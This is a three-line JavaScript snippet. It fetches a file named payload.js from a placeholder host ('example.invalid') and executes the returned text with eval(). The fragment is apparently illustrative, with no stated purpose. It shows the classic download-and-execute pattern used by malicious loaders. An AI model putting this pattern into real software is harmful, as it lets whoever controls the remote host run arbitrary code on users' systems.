const res = await fetch("https://example.invalid/payload.js");
const code = await res.text();
eval(code);
